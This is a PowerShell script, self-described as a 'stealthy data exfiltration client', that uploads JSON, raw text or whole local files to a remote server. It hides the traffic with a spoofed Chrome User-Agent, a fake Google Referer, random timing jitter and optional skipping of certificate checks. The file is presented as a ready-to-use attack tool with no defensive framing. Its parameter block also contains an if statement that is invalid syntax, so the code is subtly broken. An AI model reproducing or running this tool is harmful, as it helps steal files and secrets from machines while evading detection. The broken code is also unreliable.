# Stealthy data exfiltration client (PowerShell)
# Usage examples:
#   pwsh client/ps_exfil.ps1 -Base https://host:8080 -Mode json -Payload '{"a":1}' -Token $env:EXFIL_TOKEN
#   pwsh client/ps_exfil.ps1 -Base https://host:8080 -Mode raw -Payload 'hello world' -Path /api/v1/collect
#   pwsh client/ps_exfil.ps1 -Base https://host:8080 -Mode file -Payload C:\\path\\to\\file.txt

param(
  [Parameter(Mandatory=$true)][string]$Base,
  [Parameter(Mandatory=$true)][ValidateSet('json','raw','file')][string]$Mode,
  [Parameter(Mandatory=$true)][string]$Payload,
  [string]$Path=$env:EXFIL_PATH
    if (!$Path) { $Path = '/exfil' }
  ,
  [string]$Token=$env:EXFIL_TOKEN,
  [string]$Referer='https://www.google.com/',
  [int]$MinJitterMs=[int]($env:EXFIL_JITTER_MIN_MS | ForEach-Object { if ($_){$_} else {0} }),
  [int]$MaxJitterMs=[int]($env:EXFIL_JITTER_MAX_MS | ForEach-Object { if ($_){$_} else {0} }),
  [switch]$Insecure
)

function Invoke-Jitter($MinMs, $MaxMs) {
  if ($MaxMs -le 0) { return }
  $rand = Get-Random -Minimum $MinMs -Maximum ($MaxMs + 1)
  Start-Sleep -Milliseconds $rand
}

$headers = @{
  'User-Agent'    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
  'Accept'        = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
  'Accept-Language' = 'en-US,en;q=0.9';
  'Connection'    = 'keep-alive';
  'Cache-Control' = 'max-age=0';
  'DNT'           = '1';
  'Referer'       = $Referer
}
if ($Token) { $headers['Authorization'] = "Bearer $Token" }

Invoke-Jitter -MinMs $MinJitterMs -MaxMs $MaxJitterMs

try {
  if ($Mode -eq 'json') {
    $uri = "$($Base.TrimEnd('/'))$Path"
    $response = Invoke-RestMethod -Method Post -Uri $uri -Headers $headers -ContentType 'application/json' -Body $Payload -SkipCertificateCheck:$Insecure
    $response | ConvertTo-Json -Depth 4
  }
  elseif ($Mode -eq 'raw') {
    $uri = "$($Base.TrimEnd('/'))$Path"
    $result = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Body $Payload -SkipCertificateCheck:$Insecure
    Write-Output "Status: $($result.StatusCode)"
    if ($result.Content) { $result.Content.Substring(0, [Math]::Min(500, $result.Content.Length)) }
  }
  else {
    $uri = "$($Base.TrimEnd('/'))/upload"
    $filePath = (Resolve-Path $Payload).Path
    $form = @{ file = Get-Item -LiteralPath $filePath }
    $result = Invoke-WebRequest -Method Post -Uri $uri -Headers $headers -Form $form -SkipCertificateCheck:$Insecure
    Write-Output "Status: $($result.StatusCode)"
    if ($result.Content) { $result.Content.Substring(0, [Math]::Min(500, $result.Content.Length)) }
  }
}
catch {
  Write-Error $_
  exit 1
}

